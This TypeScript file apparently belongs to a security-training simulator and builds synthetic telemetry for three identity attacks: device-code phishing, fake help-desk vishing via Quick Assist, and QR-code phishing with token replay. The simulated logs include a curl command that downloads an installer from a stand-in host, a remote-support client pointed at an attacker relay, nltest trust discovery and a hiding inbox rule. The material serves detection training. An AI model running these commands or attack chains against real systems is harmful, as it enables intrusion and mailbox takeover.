/**
 * Identity stories.
 *
 *  1. core-device-code-phish: Teams-invite lure carrying a device code on the real Microsoft sign-in
 *     page. The victim's interactive deviceCode sign-in comes from the office; the attacker's token
 *     redemption is a non-interactive sign-in from a hosting IP. Then Microsoft Authentication Broker,
 *     device registration, a Graph mail search and an internal lure.
 *  2. core-teams-helpdesk-vishing: mailbox flood, a one-on-one Teams chat from an external tenant with a
 *     help desk display name, Quick Assist, a curl download and a remote support client.
 *  3. core-qr-code-phish: a QR-only lure, a sign-in from a phone no EDR covers, token replay, a new
 *     authenticator and an inbox rule.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { entraAudit, entraSignIn } from "@/lib/sim/emitters/entra";
import { m365Operation } from "@/lib/sim/emitters/m365";
import { sentinelAlert } from "@/lib/sim/emitters/sentinel";
import { csAlert, csDns, csFile, csProcess } from "@/lib/sim/emitters/crowdstrike";
import { panConnection, panWeb } from "@/lib/sim/emitters/paloalto";
import { winServiceInstall } from "@/lib/sim/emitters/windowsSecurity";
import { mailClick, mailDelivered } from "@/lib/sim/scenario-packs/corroboratingTelemetry.events";
import { AD_COMPANIES, clock, incident, lookalike, type CoreStoryDef } from "./_kit";

const OFFICE_EGRESS = "217.177.80.10";
const BROKER_APP_ID = "29d9ed98-a469-4536-ade2-f981bc1d605e";
const UA_EDGE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.3520.46";
const UA_PYTHON = "python-requests/2.32.3";
const UA_IPHONE = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1";

// ── 1. Device code phishing ──────────────────────────────────────────────────
function deviceCodePhish(): TelemetryEvent[] {
  const T = clock("2026-10-06T08:40:00Z");
  const cx = "nexacorp";
  const v = "v.marchetti@nexacorp.com";
  const attacker = "203.0.113.201";
  const sender = "198.51.100.201";
  const phishSender = "events@northbridge-forum.example";
  const messageId = "<c81f02ab7714@northbridge-forum.example>";
  const session = "6f3b1c02-58a1-4c52-9a44-1f0de7a2c931";
  const deviceId = "d41e7c60-2f8b-4a3e-b0c1-7e55a9c3d210";
  const correlation = "a7c2f190-6b1e-4e0a-8d33-52c9e10b7f44";
  const rogueDevice = "DESKTOP-K7Q2M1R";
  return incident("inc:core-device-code:1", [
    lookalike(entraSignIn({
      companyId: cx, id: "cdc01", ts: T(0), user: "mtr.boardroom3@nexacorp.com", srcIp: OFFICE_EGRESS, app: "Microsoft Teams",
      authenticationProtocol: "deviceCode", isInteractive: true, managed: true, compliant: true, os: "Android", conditionalAccess: "success",
      severity: "low", userAgent: "Dalvik/2.1.0 (Linux; U; Android 12; Teams Room Panel)",
      description: "Entra ID sign-in for the mtr.boardroom3 account to Microsoft Teams from the office egress, authenticationProtocol deviceCode, on a compliant Android device.",
    }), "Teams Rooms panels are provisioned with the device code flow. Compliant, managed device on the office egress, using a room resource account."),
    mailDelivered({
      id: "cdc02", ts: T(600), incidentId: "inc:core-device-code:1", user: v, sender: phishSender,
      headerFrom: "\"Daniel Reuter, Northbridge Forum\" <events@northbridge-forum.example>",
      subject: "Microsoft Teams invitation: Q4 supplier roundtable, meeting ID enclosed", messageId, senderIp: sender, qid: "7Cd41F0A92",
      url: "https://microsoft.com/devicelogin", urlRewritten: "https://microsoft.com/devicelogin", domain: "microsoft.com",
      spf: "pass", dkim: "pass", dmarc: "pass", phishScore: 12, spamScore: 8, severity: "low", mitre: "T1566.002", tactic: "Initial Access",
      description: "A Teams meeting invitation was delivered to v.marchetti from events@northbridge-forum.example. The only link in the message is the Microsoft device login page, and the body gives a nine-character value described as a meeting ID.",
    }),
    { ...mailClick({
      id: "cdc03", ts: T(1320), incidentId: "inc:core-device-code:1", user: v, sender: phishSender, messageId, qid: "7Cd41F0A92",
      url: "https://microsoft.com/devicelogin", domain: "microsoft.com", clickIp: OFFICE_EGRESS, userAgent: UA_EDGE,
      description: "v.marchetti followed the link in the Northbridge Forum invitation to the Microsoft device login page from the office egress.",
    }), mitre_technique: "T1204.001", mitre_tactic: "Execution" },
    entraSignIn({
      companyId: cx, id: "cdc04", ts: T(1344), user: v, srcIp: OFFICE_EGRESS, result: "failure", errorCode: "50199", app: "Microsoft Authentication Broker", appId: BROKER_APP_ID,
      authenticationProtocol: "deviceCode", isInteractive: true, userAgent: UA_EDGE, os: "Windows 10", browser: "Edge 150.0.0", sessionId: session, severity: "low",
      extra: { "azure.signinlogs.resultDescription": "For security reasons, user confirmation is required for this request." },
      description: "Entra ID interactive sign-in for v.marchetti to Microsoft Authentication Broker from the office egress, authenticationProtocol deviceCode, interrupted with error 50199 pending user confirmation.",
    }),
    entraSignIn({
      companyId: cx, id: "cdc05", ts: T(1358), user: v, srcIp: OFFICE_EGRESS, app: "Microsoft Authentication Broker", appId: BROKER_APP_ID, resource: "Device Registration Service",
      authenticationProtocol: "deviceCode", isInteractive: true, mfa: true, userAgent: UA_EDGE, os: "Windows 10", browser: "Edge 150.0.0", sessionId: session, severity: "medium",
      mitre: "T1528", tactic: "Credential Access",
      description: "Entra ID interactive sign-in for v.marchetti to Microsoft Authentication Broker from the office egress completed with MFA, authenticationProtocol deviceCode, resource Device Registration Service.",
    }),
    entraSignIn({
      companyId: cx, id: "cdc06", ts: T(1364), user: v, srcIp: attacker, app: "Microsoft Authentication Broker", appId: BROKER_APP_ID, resource: "Device Registration Service",
      authenticationProtocol: "deviceCode", isInteractive: false, mfa: true, userAgent: UA_PYTHON, sessionId: session, asn: 64511, severity: "high",
      mitre: "T1550.001", tactic: "Lateral Movement", extra: { "azure.signinlogs.properties.clientAppUsed": "Mobile Apps and Desktop clients" },
      description: "Entra ID non-interactive sign-in for v.marchetti to Microsoft Authentication Broker from 203.0.113.201, user agent python-requests.",
    }),
    { ...sentinelAlert({
      companyId: cx, id: "cdc07", ts: T(1500), user: v, srcIp: attacker, alertName: "Device code sign-in followed by token use from a second network", severity: "high",
      mitre: "T1528", tactic: "Credential Access", detail: "A deviceCode sign-in and a non-interactive sign-in share one sessionId across two networks and two user agents.",
      extendedProperties: { UserPrincipalName: v, SessionId: session, FirstIp: OFFICE_EGRESS, SecondIp: attacker, AuthenticationProtocol: "deviceCode" },
      description: "Sentinel analytic: one session for v.marchetti spans the office egress and 203.0.113.201 after a deviceCode sign-in.",
    }), edr_scope: "non_edr" as const },
    entraAudit({
      companyId: cx, id: "cdc08", ts: T(1560), operationName: "Register device", category: "Device", loggedByService: "Device Registration Service", operationType: "Add",
      initiatedByUpn: v, initiatedByIp: attacker, targetUpn: v, correlationId: correlation, severity: "high", mitre: "T1098.005", tactic: "Persistence",
      extra: { "azure.auditlogs.properties.additionalDetails.Device Id": deviceId, "azure.auditlogs.properties.additionalDetails.Device OS": "Windows", "azure.auditlogs.properties.additionalDetails.Device Trust Type": "Workplace", "azure.auditlogs.properties.additionalDetails.User-Agent": "Dsreg/10.0 (Windows 10.0.19045.2006)", "azure.auditlogs.properties.targetResources[1].displayName": rogueDevice },
      description: "Entra ID audit: Register device by v.marchetti from 203.0.113.201 for a workplace-joined Windows device named DESKTOP-K7Q2M1R, user agent Dsreg/10.0.",
    }),
    entraAudit({
      companyId: cx, id: "cdc09", ts: T(1562), operationName: "Add registered owner to device", category: "Device", loggedByService: "Core Directory", operationType: "Assign",
      initiatedByUpn: v, initiatedByIp: attacker, targetUpn: v, correlationId: correlation, severity: "medium", mitre: "T1098.005", tactic: "Persistence",
      extra: { "azure.auditlogs.properties.targetResources[1].displayName": rogueDevice },
      description: "Entra ID audit: Add registered owner to device, DESKTOP-K7Q2M1R assigned to v.marchetti.",
    }),
    entraSignIn({
      companyId: cx, id: "cdc10", ts: T(1680), user: v, srcIp: attacker, app: "Microsoft Graph", resource: "Microsoft Graph", isInteractive: false, mfa: true, deviceName: rogueDevice, deviceId, os: "Windows 10",
      incomingTokenType: "primaryRefreshToken", trustType: "Workplace", userAgent: UA_PYTHON, asn: 64511, severity: "high", mitre: "T1550.001", tactic: "Lateral Movement", extra: { "azure.signinlogs.properties.clientAppUsed": "Mobile Apps and Desktop clients" },
      description: "Entra ID non-interactive sign-in for v.marchetti to Microsoft Graph from 203.0.113.201 on device DESKTOP-K7Q2M1R.",
    }),
    m365Operation({
      companyId: cx, id: "cdc11", ts: T(1860), user: v, operation: "MailItemsAccessed", workload: "Exchange", srcIp: attacker, sessionId: session, userAgent: UA_PYTHON,
      severity: "high", mitre: "T1114.002", tactic: "Collection", extra: { MailAccessType: "Bind", ClientAppId: BROKER_APP_ID, OperationCount: "42" },
      description: "Unified audit log: MailItemsAccessed for v.marchetti from 203.0.113.201 through Microsoft Graph, 42 messages bound in one aggregated record.",
    }),
    m365Operation({
      companyId: cx, id: "cdc12", ts: T(2340), user: v, operation: "Send", workload: "Exchange", srcIp: attacker, sessionId: session, userAgent: UA_PYTHON,
      severity: "high", mitre: "T1534", tactic: "Lateral Movement", extra: { "Item.Subject": "Microsoft Teams invitation: supplier review, meeting ID enclosed", "Item.ParentFolder.Path": "\\Sent Items" },
      description: "Unified audit log: Send from v.marchetti's mailbox at 203.0.113.201, subject a Teams invitation to a supplier review, addressed to internal recipients.",
    }),
  ]);
}

// ── 2. Teams help desk vishing into Quick Assist and a remote support client ─
function teamsHelpdeskVishing(): TelemetryEvent[] {
  const T = clock("2026-10-07T13:05:00Z");
  const cx = "nexacorp";
  const v = "h.novak@nexacorp.com";
  const host = "WS-ACC-4477";
  const ip = "10.10.20.77";
  const it = "t.brandt@nexacorp.com";
  const cs = { companyId: cx, host, user: v, srcIp: ip };
  const qa = "C:\\Program Files\\WindowsApps\\MicrosoftCorporationII.QuickAssist_2.0.31.0_x64__8wekyb3d8bbwe\\Microsoft.RemoteAssistance.QuickAssist\\QuickAssist.exe";
  const qaHash = makeSha256("quick-assist-signed-microsoft");
  const cmdHash = makeSha256("windows_cmd_exe_signed_microsoft");
  const curlHash = makeSha256("windows_curl_exe_signed_microsoft");
  const installer = "C:\\ProgramData\\spamfilter\\update_client.exe";
  const installerHash = makeSha256("core-teams-remote-client-installer");
  const svcPath = "C:\\Program Files (x86)\\ScreenConnect Client (4f1e9a07c2d3)\\ScreenConnect.ClientService.exe";
  const svcHash = makeSha256("remote-support-client-signed");
  const relayIp = "203.0.113.202";
  const relay = "relay-417.supportdesk-remote.example";
  const stageIp = "203.0.113.203";
  const stage = "spamfilter-update.example";
  const tenant = "b6d2f7e4-90c1-4a17-8e3a-6c1f0a2b7d55";
  return incident("inc:core-teams-vish:1", [
    lookalike(csProcess({
      ...cs, id: "ctv01", ts: T(0), user: it, processName: "QuickAssist.exe", pid: 6120, processPath: qa, cmdline: `"${qa}"`, parentName: "explorer.exe", parentPid: 3480,
      sha256: qaHash, signed: true, signatureSubject: "Microsoft Corporation", severity: "low",
      description: "QuickAssist.exe started on WS-ACC-4477 from explorer.exe during a session for t.brandt, an IT support technician.",
    }), "Help desk ticket: the IT technician used Quick Assist with the user on the phone to fix a printer. The technician is in the company directory and the session ended with the ticket."),
    { ...sentinelAlert({
      companyId: cx, id: "ctv02", ts: T(3600), user: v, srcIp: "198.51.100.204", alertName: "Inbound mail volume far above baseline for one recipient", severity: "medium",
      mitre: "T1667", tactic: "Impact", detail: "Inbound message count to one mailbox exceeded the anomaly threshold; most senders are newsletter and sign-up confirmation services.",
      extendedProperties: { Recipient: v, MessageCount: 612, DistinctSenderDomains: 188, ExpectedMessages: 14, WindowMinutes: 45, AnomalyScore: 31 },
      description: "Sentinel analytic: 612 messages from 188 sender domains reached h.novak in 45 minutes against an expected 14, mostly sign-up confirmations.",
    }), edr_scope: "hybrid" as const },
    m365Operation({
      companyId: cx, id: "ctv03", ts: T(4380), user: v, operation: "ChatCreated", workload: "MicrosoftTeams", srcIp: OFFICE_EGRESS, severity: "medium", mitre: "T1566.003", tactic: "Initial Access",
      extra: {
        ChatThreadId: "19:b6d2f7e490c14a17@unq.gbl.spaces",
        CommunicationType: "OneonOne",
        Members: [
          { DisplayName: "Help Desk", UPN: "helpdesk@supportdesk-remote.example", OrganizationId: tenant },
          { DisplayName: "Hana Novak", UPN: v },
        ] as unknown as string,
        ParticipantInfo: { HasForeignTenantUsers: true, HasGuestUsers: false, HasOtherGuestUsers: false, ParticipatingTenantIds: [tenant] } as unknown as string,
      },
      description: "Microsoft 365 audit: ChatCreated, a one-on-one Teams chat with h.novak started by a user with display name Help Desk, UPN helpdesk@supportdesk-remote.example, HasForeignTenantUsers true.",
    }),
    { ...csAlert({
      ...cs, id: "ctv04", ts: T(4560), threatName: "Suspicious activity using Quick Assist", detail: "A Quick Assist session started on this device.",
      mitre: "T1219.002", tactic: "Command and Control", technique: "Remote Access Tools: Remote Desktop Software", severity: "high", action: "detected",
      processName: "QuickAssist.exe", processPath: qa, cmdline: `"${qa}"`, pid: 7204, parentPath: "C:\\Windows\\explorer.exe", processTree: "explorer.exe > QuickAssist.exe",
      description: "EDR alert on WS-ACC-4477: Suspicious activity using Quick Assist, process QuickAssist.exe (pid 7204) under explorer.exe for h.novak.",
    }), edr_scope: "hybrid" as const },
    csProcess({
      ...cs, id: "ctv05", ts: T(4561), processName: "QuickAssist.exe", pid: 7204, processPath: qa, cmdline: `"${qa}"`, parentName: "explorer.exe", parentPid: 3480,
      sha256: qaHash, signed: true, signatureSubject: "Microsoft Corporation", severity: "medium", mitre: "T1219.002", tactic: "Command and Control",
      description: "QuickAssist.exe started on WS-ACC-4477 from explorer.exe for h.novak.",
    }),
    csDns({
      ...cs, id: "ctv06", ts: T(4563), domain: "remoteassistance.support.services.microsoft.com", resolvedIp: "13.107.246.60", processName: "QuickAssist.exe", processPath: qa, pid: 7204,
      parentName: "explorer.exe", parentPid: 3480, severity: "low",
      description: "QuickAssist.exe (pid 7204) resolved remoteassistance.support.services.microsoft.com.",
    }),
    csProcess({
      ...cs, id: "ctv07", ts: T(4800), processName: "cmd.exe", pid: 7380, processPath: "C:\\Windows\\System32\\cmd.exe", cmdline: "cmd.exe", parentName: "QuickAssist.exe", parentPid: 7204,
      sha256: cmdHash, signed: true, signatureSubject: "Microsoft Corporation", severity: "high", mitre: "T1059.003", tactic: "Execution",
      description: "cmd.exe started as a child of QuickAssist.exe on WS-ACC-4477.",
    }),
    csProcess({
      ...cs, id: "ctv08", ts: T(4830), processName: "curl.exe", pid: 7412, processPath: "C:\\Windows\\System32\\curl.exe",
      cmdline: `curl.exe -s -o ${installer} https://${stage}/client/update_client.exe`, parentName: "cmd.exe", parentPid: 7380, sha256: curlHash, signed: true, signatureSubject: "Microsoft Corporation",
      severity: "high", mitre: "T1105", tactic: "Command and Control",
      description: "curl.exe, started from cmd.exe, wrote update_client.exe to C:\\ProgramData\\spamfilter from spamfilter-update.example.",
    }),
    panWeb({
      ...cs, id: "ctv09", ts: T(4831), url: `https://${stage}/client/update_client.exe`, domain: stage, category: "newly-registered-domain", action: "alert", dstIp: stageIp, status: 200, bytesIn: 6_204_416,
      file: { name: "update_client.exe", path: "/client/update_client.exe", sha256: installerHash, size: 6_204_416 }, fileType: "pe", severity: "medium", mitre: "T1105", tactic: "Command and Control",
      description: "Firewall URL log: WS-ACC-4477 downloaded update_client.exe from spamfilter-update.example, a newly registered domain.",
    }),
    csFile({
      ...cs, id: "ctv10", ts: T(4836), path: installer, sha256: installerHash, size: 6_204_416, signed: false, severity: "medium", actorProcess: "curl.exe", actorPid: 7412,
      actorPath: "C:\\Windows\\System32\\curl.exe", mitre: "T1105", tactic: "Command and Control",
      description: "curl.exe (pid 7412) wrote C:\\ProgramData\\spamfilter\\update_client.exe.",
    }),
    winServiceInstall({
      companyId: cx, id: "ctv11", ts: T(4920), host, targetUser: "SYSTEM", userEmail: null, serviceName: "ScreenConnect Client (4f1e9a07c2d3)",
      imagePath: `"${svcPath}" "?e=Access&y=Guest&h=${relay}&p=8041"`, logSource: "windows_security", severity: "high", mitre: "T1543.003", tactic: "Persistence",
      description: "System log 7045 on WS-ACC-4477: service ScreenConnect Client (4f1e9a07c2d3) installed, auto start, connecting to relay-417.supportdesk-remote.example.",
    }),
    csProcess({
      ...cs, id: "ctv12", ts: T(4925), processName: "ScreenConnect.ClientService.exe", pid: 8120, processPath: svcPath, cmdline: `"${svcPath}" "?e=Access&y=Guest&h=${relay}&p=8041"`,
      parentName: "services.exe", parentPid: 740, sha256: svcHash, signed: true, signatureSubject: "ConnectWise, LLC", runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", severity: "high",
      mitre: "T1219.002", tactic: "Command and Control",
      description: "ScreenConnect.ClientService.exe started from services.exe on WS-ACC-4477 as SYSTEM, relay host relay-417.supportdesk-remote.example.",
    }),
    panConnection({
      ...cs, id: "ctv13", ts: T(4928), domain: relay, dstIp: relayIp, remotePort: 8041, app: "ssl", action: "allow", category: "unknown", bytesOut: 48_211, bytesIn: 131_904, severity: "high",
      mitre: "T1219.002", tactic: "Command and Control",
      description: "Firewall: WS-ACC-4477 opened a session to 203.0.113.202:8041 (relay-417.supportdesk-remote.example).",
    }),
    csProcess({
      ...cs, id: "ctv14", ts: T(5400), processName: "nltest.exe", pid: 8344, processPath: "C:\\Windows\\System32\\nltest.exe", cmdline: "nltest.exe /domain_trusts /all_trusts", parentName: "ScreenConnect.ClientService.exe", parentPid: 8120,
      sha256: makeSha256("windows_nltest_exe_signed_microsoft"), signed: true, signatureSubject: "Microsoft Corporation", runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", severity: "high", mitre: "T1482", tactic: "Discovery",
      description: "nltest.exe /domain_trusts /all_trusts ran on WS-ACC-4477 as a child of ScreenConnect.ClientService.exe.",
    }),
  ]);
}

// ── 3. QR-code phishing ──────────────────────────────────────────────────────
function qrCodePhish(): TelemetryEvent[] {
  const T = clock("2026-10-08T07:50:00Z");
  const cx = "nexacorp";
  const v = "s.lindqvist@nexacorp.com";
  const proxy = "203.0.113.204";
  const replay = "203.0.113.205";
  const session = "2e7a90c4-1b6d-4f38-a052-9c4de1f07b16";
  const lure = "https://mfa-renewal-portal.example/r/7Fq2";
  const benefits = "https://enrol.brightpath-benefits.example/autumn";
  const qr = (ev: TelemetryEvent): TelemetryEvent => {
    const { "pps.urls[0].rewritten": _dropped, ...raw } = ev.raw as Record<string, unknown>;
    return { ...ev, raw: { ...raw, UrlLocation: "QRCode" } };
  };
  return incident("inc:core-qr-phish:1", [
    lookalike(qr(mailDelivered({
      id: "cqr01", ts: T(0), incidentId: "inc:core-qr-phish:1", user: "m.ferris@nexacorp.com", sender: "enrol@brightpath-benefits.example", headerFrom: "\"BrightPath Benefits\" <enrol@brightpath-benefits.example>",
      subject: "Autumn benefits enrolment: scan to open your plan", messageId: "<e4a1b07c55d2@brightpath-benefits.example>", senderIp: "198.51.100.205", qid: "9Ab10C3E41",
      url: benefits, urlRewritten: benefits, domain: "enrol.brightpath-benefits.example", spf: "pass", dkim: "pass", dmarc: "pass", phishScore: 4, spamScore: 6, severity: "low",
      description: "A benefits enrolment message was delivered to m.ferris with no body link; the URL comes from a QR code in the message and points to enrol.brightpath-benefits.example.",
    })), "HR's benefits provider sends this each autumn, from a domain on the approved vendor list. The QR code opens the provider's own site and no Microsoft sign-in follows."),
    qr(mailDelivered({
      id: "cqr02", ts: T(1800), incidentId: "inc:core-qr-phish:1", user: v, sender: "it-notice@mfa-renewal-portal.example", headerFrom: "\"IT Service Desk\" <it-notice@mfa-renewal-portal.example>",
      subject: "Action needed: renew your multi-factor registration today", messageId: "<aa93c1f2076e@mfa-renewal-portal.example>", senderIp: "198.51.100.206", qid: "9Ab10C7D12",
      url: lure, urlRewritten: lure, domain: "mfa-renewal-portal.example", spf: "pass", dkim: "pass", dmarc: "none", phishScore: 34, spamScore: 11, severity: "medium", mitre: "T1566.002", tactic: "Initial Access",
      description: "A multi-factor renewal notice was delivered to s.lindqvist with no body link; the URL comes from a QR code in the message and points to mfa-renewal-portal.example.",
    })),
    entraSignIn({
      companyId: cx, id: "cqr03", ts: T(2520), user: v, srcIp: proxy, app: "OfficeHome", mfa: true, isInteractive: true, os: "iOS 18", browser: "Mobile Safari", managed: false, compliant: false,
      userAgent: UA_IPHONE, sessionId: session, asn: 64512, severity: "medium", mitre: "T1557", tactic: "Credential Access",
      description: "Entra ID sign-in for s.lindqvist to OfficeHome from 203.0.113.204, MFA satisfied, Mobile Safari on an unmanaged iOS device with no device id.",
    }),
    entraSignIn({
      companyId: cx, id: "cqr04", ts: T(2760), user: v, srcIp: replay, app: "OfficeHome", mfa: true, isInteractive: false, os: "Windows 10", browser: "Chrome 149.0.0", managed: false, compliant: false,
      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36", sessionId: session, asn: 64513, riskLevel: "high", riskEventTypes: ["anomalousToken"], severity: "high",
      mitre: "T1550.004", tactic: "Lateral Movement",
      description: "Entra ID non-interactive sign-in for s.lindqvist to OfficeHome from 203.0.113.205, Chrome on Windows. Identity Protection risk event anomalousToken.",
    }),
    { ...sentinelAlert({
      companyId: cx, id: "cqr05", ts: T(2880), user: v, srcIp: replay, alertName: "One session used from two networks and two device types", severity: "high", mitre: "T1550.004", tactic: "Lateral Movement",
      detail: "A sessionId was seen on an iOS device and on Windows within minutes, on two networks.",
      extendedProperties: { UserPrincipalName: v, SessionId: session, FirstIp: proxy, SecondIp: replay, RiskEventType: "anomalousToken" },
      description: "Sentinel analytic: one session for s.lindqvist on 203.0.113.204 (iOS) and 203.0.113.205 (Windows).",
    }), edr_scope: "non_edr" as const },
    entraAudit({
      companyId: cx, id: "cqr06", ts: T(3120), operationName: "User registered security info", category: "UserManagement", loggedByService: "Authentication Methods", operationType: "Add",
      initiatedByUpn: v, initiatedByIp: replay, targetUpn: v, severity: "high", mitre: "T1098.005", tactic: "Persistence",
      extra: { "azure.auditlogs.properties.resultReason": "User registered Mobile app notification" },
      description: "Entra ID audit: s.lindqvist registered a mobile app notification method from 203.0.113.205.",
    }),
    m365Operation({
      companyId: cx, id: "cqr07", ts: T(3480), user: v, operation: "New-InboxRule", workload: "Exchange", srcIp: replay, sessionId: session, severity: "high", mitre: "T1564.008", tactic: "Stealth",
      extra: { "Parameters.Name": "..", "Parameters.SubjectOrBodyContainsWords": "invoice;payment;security", "Parameters.MoveToFolder": "RSS Feeds", "Parameters.MarkAsRead": "True" },
      description: "Unified audit log: New-InboxRule for s.lindqvist from 203.0.113.205, rule named '..', moves mail mentioning invoice, payment or security to RSS Feeds and marks it read.",
    }),
  ]);
}

export const IDENTITY_STORIES: CoreStoryDef[] = [
  { id: "core-device-code-phish", title: "Device Code Phishing: Meeting Invite to Registered Device and Mail Search", complexity: "core", companies: AD_COMPANIES, events: deviceCodePhish() },
  { id: "core-teams-helpdesk-vishing", title: "Mailbox Flood, Fake Help Desk on Teams, Quick Assist to Remote Support Client", complexity: "advanced", companies: [...AD_COMPANIES, "quantumbank"], events: teamsHelpdeskVishing() },
  { id: "core-qr-code-phish", title: "QR Code Phishing: Sign-In from a Phone No EDR Covers, Then Token Replay", complexity: "core", companies: AD_COMPANIES, events: qrCodePhish() },
];
